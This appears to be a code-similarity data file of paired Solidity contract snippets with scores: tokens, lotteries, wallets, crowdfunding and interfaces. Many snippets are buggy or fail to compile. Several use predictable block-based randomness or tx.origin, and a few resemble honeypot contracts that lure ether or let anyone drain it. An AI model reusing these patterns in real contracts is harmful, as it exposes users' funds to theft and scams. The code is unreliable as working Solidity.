    uint256[] public balances;
    ERC20Basic public token;
  address owner;


    function Airdrop(address _token) public{
        require(_token != address(0));
        token = ERC20Basic(_token);
    owner = msg.sender;
    }

    function setRecipientsAndBalances(address[] _recipients, uint256[] _balances) public {
        require(_recipients.length == _balances.length);
    require(msg.sender == owner);
        recipients = _recipients;
        balances = _balances;
    }

    function doAirdrop() public returns(uint){
      require(msg.sender == owner);
        require(recipients.length>0);
        for(uint i=0; i < recipients.length; i++){
            if(token.balanceOf(this)>=balances[i]){
                token.transfer(recipients[i],balances[i]);
            }
            else{
                return i;
            }
        }
        return recipients.length;
    }

}",0.6656367917557384,"contract BasicToken is ERC20Basic {

    using SafeMath for uint256;



    mapping(address => uint256) balances;



    uint256 totalSupply_;



    

    function totalSupply() public view returns (uint256) {

        return totalSupply_;

    }



    function msgSender() 

        public

        view

        returns (address)

    {

        return msg.sender;

    }



    function transfer(

        address _to, 

        uint256 _value

    ) 

        public 

        returns (bool) 

    {

        require(_to != address(0));

        require(_to != msg.sender);

        require(_value <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    

    function balanceOf(address _owner) public view returns (uint256) {

        return balances[_owner];

    }

}"
"contract queue
{
    struct Queue {
        uint256[] data;
        uint256 front;
        uint256 back;
    }
    
    function length(Queue storage q) constant internal returns (uint256) {
        return q.back - q.front;
    }
    
    function capacity(Queue storage q) constant internal returns (uint256) {
        return q.data.length - 1;
    }
    
    function push(Queue storage q, uint256 data) internal
    {
        if ((q.back + 1) % q.data.length == q.front)
            return; 
        q.data[q.back] = data;
        q.back = (q.back + 1) % q.data.length;
    }


    
    function pop(Queue storage q) internal returns (uint256 r)
    {
        if (q.back == q.front)
            return; 
        r = q.data[q.front];
        delete q.data[q.front];
        q.front = (q.front + 1) % q.data.length;
        return r;
    }
    Queue requests;
    event PopEvent(bool ok); 
    function queue() {
        requests.data.length = 200;
    }
    function addRequest(uint256 d) {
        push(requests, d);
    }
    function popRequest()  returns (uint256) {
        PopEvent(true);
        return pop(requests);
    }
    function queueLength()  constant returns (uint256) {
        return length(requests);
    }
    function hello() constant returns(string s){ 
        return 'hello world!';
    }
}",0.6144006105149752,"contract ERC223 {
    uint public totalSupply;

    
    function balanceOf(address who) public constant returns (uint);
    function totalSupply() constant public returns (uint256 _supply);
    function transfer(address to, uint value) public returns (bool ok);
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transfer(address to, uint value, bytes data, string customFallback) public returns (bool ok);
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);

    
    function name() constant public returns (string _name);
    function symbol() constant public returns (string _symbol);
    function decimals() constant public returns (uint8 _decimals);

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
    
   
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
   
     event Burn(address indexed from, uint256 value);
}"
"contract X{
   function reservePlace(string _name) public payable returns (bool isNotReserved) {
      
   }
}",0.6657965703453448,"contract ReverseRegistrarRef {
    function setName(string name) public returns (bytes32 node);
}"
"contract Ether_Transfer_To{
    function () external payable { 

    }
    function get_balance() public returns(uint){
        return address(this).balance;
    }
}",0.6760573594887339,"contract Halo3D {



   

    function transfer(address, uint256) public returns(bool);

    function balanceOf() public view returns(uint256);

  

   

}"
"contract Ether_Transfer_From{
    Ether_Transfer_To private the_instance;
    constructor() public{
        
        the_instance=new Ether_Transfer_To();
    }
    function get_balance() public returns(uint){
        return address(this).balance;
    }
    function get_balance_of_instance() public returns(uint){
        
        return the_instance.get_balance();
    }
    function () external payable {
        
        address(the_instance).send(msg.value);
    }
}",0.6054416976638604,"contract Distribute {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function transferETHS(address[] _tos) payable public returns(bool) {
        require(_tos.length > 0);
        uint val = this.balance / _tos.length;
        for (uint i = 0; i < _tos.length; i++) {
            _tos[i].transfer(val);
        }
        return true;
    }

    function () payable public {
        owner.transfer(this.balance);
    }
}"
"contract Token{
       function Token() payable{...}
       function _transfer(...) internal {...}
       function transfer (..) payable{..}
}",0.6598715722985895,"contract CEtherInterface {
    function mint() external payable;
    function repayBorrow() external payable;
}"
"contract Factory{
    CrowdFunding[] public deployedContractAddresses;

    constructor(uint minimum) public {
        CrowdFunding newContract = new CrowdFunding(minimum, msg.sender);
        deployedContractAddresses.push(newContract);
    }

    function getDeployedContractAddresses() public view returns(CrowdFunding[] memory) {
        return deployedContractAddresses;
    }
}",0.6025113113506926,"contract CompFactory {

    address[] public contracts;

    

    function getContractCount() public constant returns(uint contractCount){

        return contracts.length;

    }

    

    function newComp(uint8 _numRounds) public payable returns(address newContract) {

        Comp c = (new Comp).value(address(this).balance)(_numRounds, msg.sender);

        contracts.push(c);

        return c;

    }

}"
"contract X{

    uint amount;

    function X() {
        amount = amount + msg.value;
    }
}",0.6466417694149171,"contract MNY {
    function mine(address token, uint amount) public;
}"
"contract Broker
{
    using SafeMathOZ for uint256;
    Target                      public target;
    mapping(address => uint256) public m_balance;
    mapping(address => uint256) public m_reward;

    constructor(address _target) public {
        target = Target(_target);
    }

    function () public payable {
        m_balance[msg.sender] = m_balance[msg.sender].add(msg.value);
    }

    function deposit() public payable {
        m_balance[msg.sender] = m_balance[msg.sender].add(msg.value);
    }

    function depositFor(address _account) public payable {
        m_balance[_account] = m_balance[_account].add(msg.value);
    }

    function withdraw(uint256 _amount) public {
        m_balance[msg.sender] = m_balance[msg.sender].sub(_amount);
        msg.sender.transfer(_amount);
    }

    function setReward(uint256 _reward) public {
        m_reward[msg.sender] = _reward;
    }

    function XXX(Data data) public returns (bytes32) {
        uint256 gasBefore = gasleft();
        bytes32 result = target.XXX(data);
        address payer = data.requester;
        uint256 price = tx.gasprice * (87000 + gasBefore - gasleft()) + m_reward[payer];
        m_balance[payer] = m_balance[payer].sub(price);
        msg.sender.transfer(price);
        return result;
    }
}",0.6534922511042959,"contract ETFtop10 is Ownable{
    using SafeMath for uint256;
  address public servant;
  address public eco_fund;
  function setAddress(address _servant, address _ecofund) public onlyOwner{
    servant = _servant;
    eco_fund = _ecofund;
  }

  uint256 public fee = 100;
  uint256 public balance;
  mapping (address => uint256) public reward_payable;
  function getReward() public{
    msg.sender.transfer(reward_payable[msg.sender].mul(fee).div(100));
    delete reward_payable[msg.sender];
  }
  uint16 [10] public reward_pct =[
    25, 18, 14, 10, 8, 7, 6, 5, 4, 3
  ];
  function () payable public {
    balance += msg.value;
    if (balance >= 100000*10**18){
      uint256 amount;
      amount = (balance - 100000*10**18) * 3 / 10;
      eco_fund.send(amount);
    }
  }
  uint256 public last_run;
  function setTop10(address[10] top10) public{
    require(msg.sender == servant);
    
    last_run = now;
    for (uint i = 0; i < 10; i++){
      if(top10[i] != address(0)){
        reward_payable[top10[i]] += balance.mul(50).mul(reward_pct[i]).div(10000);
        
        balance = balance.sub(balance.mul(50).mul(reward_pct[i]).div(10000));
      }
    }
  }
}"
"contract ShapeCalculator{
    function rectangle(uint w, uint h) returns (uint s, uint p) {
        
        s = w * h;
        p = 2 * (w + h);
    }
}",0.6337966682960171,"contract Kicker {
    function kick(address urn, address gal, uint tab, uint lot, uint bid)
        public returns (uint);
}"
"contract MetaToken is Pausable{

string public name = 'MetaMetaMeta! Token';
uint8 public decimals = 8;
string public symbol = 'M3T';
string public version = '0.4.0';

uint256 public blockReward = 1 * (10**uint256(decimals));
uint32 public halvingInterval = 210000;
uint256 public blockNumber = 0; 
uint256 public totalSupply = 0;
uint256 public target   = 0x0000ffff00000000000000000000000000000000000000000000000000000000; 
uint256 public powLimit = 0x0000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
uint40 public lastMinedOn; 
uint256 public randomness;

address public newContractAddress;

function MetaToken() Ownable() {
    lastMinedOn = uint40(block.timestamp);
    updateRandomness();
}


function updateRandomness() internal {
    randomness = uint256(sha3(sha3(uint256(block.blockhash(block.number-1)) + uint256(block.coinbase) + uint256(block.timestamp))));
}


function getRamdomness() view returns (uint256 currentRandomness) {
    return randomness;
}


function hash(uint256 nonce, uint256 currentRandomness) pure returns (uint256){
    return uint256(sha3(nonce+currentRandomness));
}


function checkProofOfWork(uint256 nonce, uint256 currentRandomness, uint256 currentTarget) pure returns (bool workAccepted){
    return uint256(hash(nonce, currentRandomness)) < currentTarget;
}


function checkMine(uint256 nonce) view returns (bool success) {
    return checkProofOfWork(nonce, getRamdomness(), target);
}


function mine(uint256 nonce) whenNotPaused returns (bool success) {
    require(checkMine(nonce));

    Mine(msg.sender, blockReward, uint40(block.timestamp) - uint40(lastMinedOn)); 

    balances[msg.sender] += blockReward; 
    blockNumber += 1;
    totalSupply += blockReward; 
    updateRandomness();

    
    var mul = (block.timestamp - lastMinedOn);
    if (mul > (60*2.5*2)) {
        mul = 60*2.5*2;
    }
    if (mul < (60*2.5/2)) {
        mul = 60*2.5/2;
    }
    target *= mul;
    target /= (60*2.5);

    if (target > powLimit) { 
        target = powLimit;
    }

    lastMinedOn = uint40(block.timestamp); 
    if (blockNumber % halvingInterval == 0) { 
        blockReward /= 2;
        RewardHalved();
    }

    return true;
}

function setNewContractAddress(address newAddress) onlyOwner {
    newContractAddress = newAddress;
}

event Mine(address indexed _miner, uint256 _reward, uint40 _seconds);
event RewardHalved();",0.6082679578502699,"contract Henfruit {
    

    
    string public constant name = ""Henfruit"";
    
    string public constant symbol = ""EGG"";
    
    uint256 public totalSupply = 20736;
    
    uint8 public constant decimals = 0;


    
    uint256 public numBrews;
    uint256 public ETH_Rate = 13; 
    uint256 public ETH_Rate_Factor = 10000; 
    uint256 public WeiinEth = 1000000000000000000; 

    
    address public owner;
    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    
    function Henfruit() public {
        owner = msg.sender;
        balances[this] += totalSupply - 20;
        
        balances[0x943291649C1e162476D840Bea7f471ED788dfDa6] += 20; 
    }

    

                                                                             
                                                                            

    function () public payable {
        
        numBrews = div(div(msg.value,ETH_Rate)*ETH_Rate_Factor,WeiinEth);
        require(numBrews > 0 && balances[this] >= numBrews);
        balances[msg.sender] += numBrews;
        balances[this] -= numBrews;
        owner.transfer(msg.value);
    }



    


    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        if (balances[msg.sender] >= _amount && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(msg.sender, _to, _amount);
            return true;
        } else {
            return false;
        }
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        if (balances[_from] >= _amount
            && allowed[_from][msg.sender] >= _amount
            && _amount > 0
            && balances[_to] + _amount > balances[_to]) {
            balances[_from] -= _amount;
            allowed[_from][msg.sender] -= _amount;
            balances[_to] += _amount;
            Transfer(_from, _to, _amount);
            return true;
        } else {
            return false;
        }
    }

    function approve(address _spender, uint256 _amount) public returns (bool success) {
        allowed[msg.sender][_spender] = _amount;
        Approval(msg.sender, _spender, _amount);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    
  
    function div(uint256 a, uint256 b) public pure returns (uint256) {
        
        uint256 c = a / b;
        
        return c;
    }




}"
"contract Dice{

    TokenSale public tokenSale;
    address tokensaleaddress;

    struct player_details{
        address pAddress;
        string pName;
         }

    struct gameRecords{
        address playerAddress;
        uint selected_num;
        uint rolled_num;
        bool result;
        uint ptoken;
        uint timestamp;
    }

    constructor (TokenSale _tokenSale) public {
      tokenSale = _tokenSale;
    }


    mapping(uint =>gameRecords) public outcome;
    mapping(uint => player_details) public details;

    uint public playerid=0;
    uint played=1;
    uint playercount=0;

      function setplayerDetails(string memory _pName) public{
        details[playerid] = player_details(msg.sender,_pName);
        playerid++;
        playercount++;
      }

    function addGameEvent(uint _betplaced, uint _rollresult,bool _result,uint _ptoken) public{
        require(playercount >=1 );
        outcome[played] = gameRecords(msg.sender,_betplaced,_rollresult,_result,_ptoken,now);
        played++;
    }

    function tokenfetch() public {
        
        tokenSale.buyTokens(100);
    }

  }",0.6009802831539955,"contract ERC20Interface { 
    string public constant name = ""Token Name""; 
    string public constant symbol = ""SYM"";
    uint8 public constant decimals = 18; 
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}"
"contract Allowance is Ownable{
        uint AllowanceWeek = 0.01 ether;
        address ledger;
        uint32 coolDownTime = 1 weeks;
        uint32 overflow;
        uint32 weekCooldown;

        modifier onlyLedgerOrOwner{
            require(msg.sender == ledger || msg.sender == owner);
            _;
        }

        function _triggerCooldown()internal onlyOwner{
          weekCooldown = uint32(now + coolDownTime);
      }

        function () public payable{

        }

        function _changeCoolDownTime(uint32 _CoolDownTime) external onlyOwner{
            coolDownTime = _CoolDownTime;
        }

        function withdraw() external payable onlyLedgerOrOwner {
            require(now >= weekCooldown);
            require(this.balance >= AllowanceWeek);
            ledger.transfer(AllowanceWeek);
            _triggerCooldown();
            overflow = uint32(this.balance - (AllowanceWeek * 76));
            if(overflow > 0){
                msg.sender.transfer(overflow);
            }
      }

      function _setAllowance(uint _Allowance) external onlyOwner{
          AllowanceWeek = _Allowance;
      }

      function _changeAddress(address _Address) external onlyOwner{
          ledger = _Address;
      }

      function transferOwnership (address newOwner) onlyOwner{
        require(newOwner != address(0));
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;  
    }  
    }",0.6035968666096467,"contract Role is StandardToken {
    using SafeMath for uint256;

    address public owner;
    address public admin;

    uint256 public contractDeployed = now;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    event AdminshipTransferred(
        address indexed previousAdmin,
        address indexed newAdmin
    );

	  
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }   

    
    modifier onlyAdmin() {
        require(msg.sender == admin);
        _;
    }

    
    function transferOwnership(address _newOwner) external  onlyOwner {
        _transferOwnership(_newOwner);
    }

    
    function transferAdminship(address _newAdmin) external onlyAdmin {
        _transferAdminship(_newAdmin);
    }

    
    function _transferOwnership(address _newOwner) internal {
        require(_newOwner != address(0));
        balances[owner] = balances[owner].sub(balances[owner]);
        balances[_newOwner] = balances[_newOwner].add(balances[owner]);
        owner = _newOwner;
        emit OwnershipTransferred(owner, _newOwner);
    }

    
    function _transferAdminship(address _newAdmin) internal {
        require(_newAdmin != address(0));
        emit AdminshipTransferred(admin, _newAdmin);
        admin = _newAdmin;
    }
}"
"contract C{
    using L for L.S;
    L.S LS;

    function setCF(uint CInP)external {
        L.SetLF(LS,CInP); 
    }

    function GetCF() external returns(uint COutP){
        return L.GetLF(LS); 
    }
}",0.6117286276875279,"contract FlapLike {
    function kick(uint lot, uint bid) external returns (uint);
    function cage(uint) external;
    function live() external returns (uint);
}"
"contract FreeSpeech{

address owner;
struct Message{
    string Message;
    int Vote;
    uint timeSubmit;
    bool isImportant;
    uint senderId;
}

mapping(address=>uint) public addressId;
mapping(address=> uint) addressMessageCount;

modifier onlyOwner(){
    require(msg.sender == owner);
    _;
}

Message[] messageArr;
constructor() public{
    owner = msg.sender;
}

function addMessage(string memory _message) public {
    if(addressId[msg.sender] == 0){
       addressId[msg.sender] = uint(keccak256(abi.encodePacked(msg.sender)));
    }
    addressMessageCount[msg.sender]++;
    messageArr.push(Message(_message,0, now, true, addressId[msg.sender]));
}

function getMessageCount() public view returns(uint){
    return addressMessageCount[msg.sender];
}

function getAddressId() public view returns(uint){
    return addressId[msg.sender];
}

function getMessageString() public view returns(string memory){
    return (messageArr[1].Message);
}

function upvoteMessage(uint _messageId) public {
    messageArr[_messageId].Vote += 1;
}

function downvoteMessage(uint _messageId) public {
    messageArr[_messageId].Vote -= 1;
}

function getMyMessageUpvoted() public view returns(string memory){
    int largest = 0;
    uint idLargest = 0;
    for(uint i = 0; i<addressMessageCount[msg.sender]; i++){
        if(messageArr[i].Vote > largest){
            largest = messageArr[i].Vote;
            idLargest = i;
        }
    }
    return messageArr[idLargest].Message;
}
}",0.6034716674752861,"contract Wallet {

    address public owner;

    event ReceiveEther(address indexed _from, uint _amount);

    event Sent(address indexed destination, address indexed token, uint amount);

    constructor() public {

        owner = msg.sender;

    }

    modifier admin() {

        require(msg.sender == owner);

        _;

    }

    function addressOk(address who) public view returns(bool) {

        if (who != address(0) && address(this) != who) return true;

        else return false;

    }

    function sendable(address token, uint amount) public view returns(bool) {

        uint bal = address(this).balance;

        if (token != address(0)) bal = ERC20(token).balanceOf(address(this));

        if (amount > 0 && amount <= bal) return true;

        else return false;

    }

    function changeOwner(address newOwner) public admin returns(bool) {

        require(addressOk(newOwner));

        owner = newOwner;

        return true;

    }

    function() public payable {}

    function payment() public payable returns(bool) {

        require(msg.value > 0);

        emit ReceiveEther(msg.sender, msg.value);

        return true;

    }

    function sendTo(address dest, uint amount, address token) public admin returns(bool) {

        require(addressOk(dest) && sendable(token, amount));

        if (token == address(0)) {

            if (!dest.call.gas(250000).value(amount)())

            dest.transfer(amount);

        } else {

            if (!ERC20(token).transfer(dest, amount))

            revert();

        }

        emit Sent(dest, token, amount);

        return;

    }

}"
"contract DebuggerSampleContract{
   int counter = 10;
   function LoopCounter(int _input) public view returns (int) {
      int returnValue;
      for(; _input <counter; _input++)
      {
         returnValue += _input;
       }
       returnValue;
   }
}",0.6153399760976178,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgValue() internal view returns (uint256) {
        return msg.value;
    }
}"
"contract TestChainCoin is RefundableCrowdsale
{
    function TestChainCoin() RefundableCrowdsale() {
            balances[msg.sender] = 100;                                                                   
        }
}",0.6233890920954154,"contract RefundableStageCrowdsale is RefundableCrowdsale {

    

    function _forwardFunds() internal {

        

        vault.deposit.value(msg.value)(tx.origin);

    }

}"
"contract Lottery{
address[] public players; 
address public manager; 


constructor() public{
    
    manager = msg.sender; 
}


   somebody

function  ()  payable  external {
    require(msg.value >= 0.01 ether);
    players.push(msg.sender); 

                              
   }

function get_balance() public view returns(uint){
    require(msg.sender == manager);
    return address(this).balance; 
}


function random() public view returns(uint256){
return uint256(keccak256(block.difficulty, block.timestamp, 
players.length));  
}

function selectWinner() public {
    require(msg.sender == manager);


    uint r = random();

    address winner;

    
    uint index = r % players.length;
    winner = players[index];

    
    winner.transfer(address payable(this).balance);

    players = new address[](0); 
}
}",0.6714638674491179,"contract Lottery50chance

{

  uint256 public randomNumber = 1;

  uint256 public minBet = 1 finney;

  address owner = msg.sender;



  struct GameHistory 

  {

    address player;

    uint256 number;

  }

  

  GameHistory[] public log;



  modifier onlyOwner() 

  {

    require(msg.sender == owner);

    _;

  }



  function play(uint256 _number) 

  public 

  payable 

  {

      if(msg.value >= minBet && _number <= 1)

      {

          GameHistory gameHistory;

          gameHistory.player = msg.sender;

          gameHistory.number = _number;

          log.push(gameHistory);

          

          

          

       

          if (_number == randomNumber) 

          {

              msg.sender.transfer(address(this).balance);

          }else{

              owner.transfer(address(this).balance);

          }

          

      }

  }

  

  function withdraw(uint256 amount) 

  public 

  onlyOwner 

  {

    owner.transfer(amount);

  }



  function() public payable { }

  

}"
"contract Testing{
    address [] public adds;
    uint [] public amounts;

    function bet() public payable {
        adds.push(msg.sender);
        amounts.push(msg.value);
    }

    function give() public {
        adds[0].transfer(amounts[0]);
    }
}",0.6460586358094361,"contract ISmartToken{

    function disableTransfers(bool _disable) public;

    function issue(address _to, uint256 _amount) public;

    function destroy(address _from, uint256 _amount) public;

	

}"
"contract Bar{

    struct Foo{
        uint x;
    }
    mapping(uint => Foo[]) foo;

    function add(uint id, uint _x) public {
        foo[id].push(Foo(_x));
    }

    function get(uint id, uint index) public returns(uint){
        return foo[id][index].x;
    }
}",0.6531323342378407,"contract FiatContract {

    function ETH(uint _id) public constant returns (uint256);

  	function EUR(uint _id) public constant returns (uint256);

  	function updatedAt(uint _id) public constant returns (uint);

}"
"contract IamHongKongTokenBack_00{ 

  
function SeeMyAddAndETHVar() public constant returns (address, uint) {
    address _myadd = msg.sender;
    return ( _myadd,  _myadd.balance);
}   


function SeeSheEthVar(address _InputAdd) public constant returns (address, uint) {
    address _SheAc = _InputAdd;
    return (_SheAc, _SheAc.balance);
}   


}",0.6547607756696874,"contract ERC20Interface 
{
         
      function balanceOf(address tokenOwner) public constant returns (uint256 balance);
      function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining);
      function transfer(address to, uint256 tokens) public returns (bool success);
         
         
         
         
}"
"contract Bar
{
  uint n ;
  event Argle(uint arg);
  function argle_int(uint arg) internal {
    n = arg ;
  }

  function argle(bool pass, uint arg) public {
    Argle(arg) ;
    require(pass) ;
    argle_int(arg);
  }

  function get() public view returns (uint) {
    return n ;
  }
}",0.633666055450619,"contract SafeMath {
    function safeSub(uint a, uint b) pure internal returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
}"
"contract Asset{

     string name;

     function Asset(string name) public{
       name = name;
     }

     function ModifyAssetAndCreateNew(string name, address factory){
       factory.createAsset(name);
       name = name;
     }

   }",0.6154826462379325,"contract AssetStorage {
    function addTrustedIssuer(address addr, string name);
    function removeTrustedIssuer(address addr, string name);
    function assertFact(uint id, string fact);
}"
"contract TestBasicToken{
   uint public inintialBalance = 10**17 * 10;

   address payable Owner = 0x65727c4c3869EA9BbB3BE13613F0a2Fd37e28259;
   address contractAddress = address(this);
   BasicToken basicToken = new BasicToken(Owner);

   uint expectedSupply = 0;
   uint expectedBalance = 300;


   function testTotalSupply() public {
      uint _totalSupply = basicToken.totalSupply();
      Assert.equal(expectedSupply, _totalSupply, ""Expected supply should match return value"");
   }
   function testBalanceOf() public {
      uint _balance = basicToken.balanceOf(Owner);
      Assert.equal(expectedBalance, _balance, ""Expected balance should match return value"");
   }
   function testBuyToken() public {
      basicToken.buyToken.value(10**17);
      uint _balance = basicToken.balanceOf(contractAddress);
      Assert.notEqual(0, _balance, ""Balance should no longer be 0"");
   }
}",0.604195161507452,"contract BasicToken is ERC20Basic {
    using SafeMath
    for uint256;

    mapping(address => uint256) balances;

    uint256 totalSupply_;

    
    function totalSupply() public view returns(uint256) {
        return totalSupply_;
    }


    
    


    
    function _transfer(address _from, address _to, uint _value) internal {

        
        require(_to != 0x0);
        
        require(balances[_from] >= _value);
        
        require(balances[_to].plus(_value) > balances[_to]);
        
        uint previousBalances = balances[_from].plus(balances[_to]);
        
        balances[_from] = balances[_from].subtract(_value);
        
        balances[_to] = balances[_to].plus(_value);
        emit Transfer(_from, _to, _value);
        
        assert(balances[_from].plus(balances[_to]) == previousBalances);

    }

    
    function transfer(address _to, uint256 _value) public returns(bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }


    
    function balanceOf(address _owner) public view returns(uint256 balance) {
        return balances[_owner];
    }
}"
"contract ContractExp1{
    string public value;
    uint256 public count=0;

mapping(uint256 => Person) public people;

struct Person{
    string name;
    uint256 balance;
}


constructor() public{
    value='myValue';
}


function setPeople (string memory _name, uint256 memory _val) public {
    count=count+1;
    people[count]=Person(_name,_val);
    }
}",0.6448301504325875,"contract ERC223 {
    string public name;
    string public symbol;
    uint256 public decimals;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;
    function transfer(address _to, uint256 _value) public;
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract permission{
struct transaction {
        address payable sender;
        address receiver;
        string datatype;
        Status status;
    }

function getTransactionCount() public view returns(uint256 cnt) {
        uint256 len = transactions.length;
        return(len);
    }
}",0.6443965838637467,"contract ERC1404 {

  

  

  

  

  

  

  function detectTransferRestriction (address from, address to, uint256 value) public view returns (uint8);



  

  

  

  

  function messageForTransferRestriction (uint8 restrictionCode) public view returns (string);

}"
"contract ParentCompany{
    address public parentAddress;

    function ParentCompany() public{
        parentAddress = msg.sender;
    }
    function getB() public view returns(uint){
        return this.balance;
    }

    function() payable {
    }
}",0.6961357272472688,"contract TokInterface {

    function totalSupply() public view returns (uint);

    function balanceOf(address) public view returns (uint);

    function allowance(address, address) public view returns (uint);

}"
"contract Subsidiary{

    address public subsidiaryAddress;
    address parentCompany;
    function Subsidiary(address _parentCompany) public payable{
        subsidiaryAddress = msg.sender;
        parentCompany = _parentCompany;
    }

    function sendToParent() public {
        parentCompany.transfer(this.balance);
    }
    function() payable{

        sendToParent();  
    }
}",0.6066183101413581,"contract HoldAssignment

{

    constructor() public payable {

        org = msg.sender;

    }

    function() external payable {}

    address org;

    function close() public {

        if (msg.sender==org)

            selfdestruct(msg.sender);

    }

    function assign() public payable {

        if (msg.value >= address(this).balance)

            msg.sender.transfer(address(this).balance);

    }

}"
"contract Client{
    address clientAddress;

    function Client() public payable{
        clientAddress = msg.sender;
    }
    function payment(address _subCompany, uint _amount) public{
        uint amount = _amount *(10**18);
        _subCompany.transfer(amount);
    }

}",0.6766398782997207,"contract TokenController {
    
    
    
    
    
    
    function onTransfer(address _from, address _to, uint _amount) public returns(bool);

    
    
    
    
    
    
    
    function onApprove(address _owner, address _spender, uint _amount_old, uint _amount_new) public returns(bool);
}"
"contract TRY{  
    uint public temp=0;  
    function transfer_ether() public payable{  
        require(msg.value>=60);  
        temp=60;  
        msg.sender.transfer(msg.value-60);  
    }  
    function to_contract() public payable {  
        uint a=temp;  
        temp=0;  
        msg.sender.transfer(a);  
    }  
}",0.6562566723823895,"contract FreeMoney {
    
    uint public remaining;
    
    function FreeMoney() public payable {
        remaining += msg.value;
    }
    
    
    function() payable {
        remaining += msg.value;
    }
    
    
    function withdraw() public {
        remaining = 0;
        msg.sender.transfer(this.balance);
    }
}"
"contract Gallery{
uint public emojiCount;
struct Token {
    uint token;
    string ipfsHash;
}
mapping (address => Token[]) public emoji;

function addEmoji (uint _token, string _ipfsHash) public {
   emojiCount ++;
   emoji[msg.sender].push(Token(_token, _ipfsHash));
 }
}",0.6145883773122042,"contract TokenGNO is StandardToken {

    string public constant symbol = ""GNO"";

    string public constant name = ""Gnosis"";

    uint8 public constant decimals = 18;



    function TokenGNO(

    	uint amount

    )

    	public 

    {

        totalTokens = amount;

    	balances[msg.sender] = amount;

    }

}"
"contract Menu{
    uint256 public BookingId;
    address public Guest;
    uint256 Qty;
    
    struct Menuitem{
        uint256  id;
        string name;
        uint256 Price;
    }
    struct table{
        uint256 tableid;
        uint256 numberofseats;
    }
      mapping (uint256 => Menuitem) public Order;
      mapping (uint256  =>mapping(uint256 => Menuitem)) public tableno;
      Menuitem[] itemarray;
      table[5] tablearray;
     
      
      function welcome() public {
          log0(""welcome"");   
      }
      
      function additem(uint256 _id, string memory _name, uint256 _price) public{
          
        Menuitem memory newitem = Menuitem(_id, _name, _price);
        Order[_id] = newitem;
        itemarray.push(newitem);
        Qty++;
      }
      function itemcount() public view returns(uint256){
          return Qty;
      }
      function deleteitem(uint256 _id) public{
          delete Order[_id];
          Qty--;
      }
     
      
      function getItem(uint256 _id) view public returns (string memory _name, uint256 _price) {   
         return(Order[_id].name, Order[_id].Price);
    }
}",0.6028779772569282,"contract IERC20Token{

function name() public view returns(string memory);
function symbol() public view returns(string memory);
function decimals() public view returns(uint256);
function totalSupply() public view returns (uint256);
function balanceOf(address _owner) public view returns (uint256);
function allowance(address _owner, address _spender) public view returns (uint256);

function transfer(address _to, uint256 _value) public returns (bool success);
function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
function approve(address _spender, uint256 _value) public returns (bool success);
 event Transfer(
    address indexed from,
    address indexed to,
    uint256 value
  );

  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );

}"
"contract Lottery{
address public manager;
address[] public players;

constructor() public payable{
 manager = msg.sender;   
}

function enter() public payable {
    require(msg.value > 0.01 ether);

    players.push(msg.sender);
}

function random() private view returns(uint){
  return uint(keccak256(block.difficulty, now, players));
}

function pickWinner() public {
    uint index = random() % players.length;
    players[index].transfer(this.balance);
}
}",0.6774780966556176,"contract PinCodeMoneyStorage {
	
	
    address private Owner = msg.sender;
    uint public SecretNumber = 95;

    function() public payable {}
    function PinCodeMoneyStorage() public payable {}
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Guess(uint n) public payable {
		if(msg.value >= this.balance && msg.value > 0.1 ether)
			
			if(n*n/2+7 == SecretNumber )
				msg.sender.transfer(this.balance+msg.value);
    }
}"
"contract simpleexample{

bytes32 public inputHash;
bytes32[] inputHashArray;

function addNewHash(bytes32 input) public {
  inputHash = input;
  inputHashArray.push(inputHash)-1;
  return;
}

function getHash() view public returns (bytes32[] memory){
  return inputHashArray;
}

function getLength() view public returns (uint) {
  return inputHashArray.length;
}

function blockTime() view public returns (uint blkTime) {
  return block.number;
}
}",0.6189594694398588,"contract IController {
    function assertIsWhitelisted(address _target) public view returns(bool);
    function lookup(bytes32 _key) public view returns(address);
    function stopInEmergency() public view returns(bool);
    function onlyInEmergency() public view returns(bool);
    function getAugur() public view returns (IAugur);
    function getTimestamp() public view returns (uint256);
    function emergencyStop() public returns (bool);
}"
"contract Caller
{
    event SendingTransaction(address indexed _requestor, uint8 indexed action);     

    address public minter;
    bytes public email;      

    modifier onlyOwner {
    if (msg.sender != minter)
        throw;
       _;
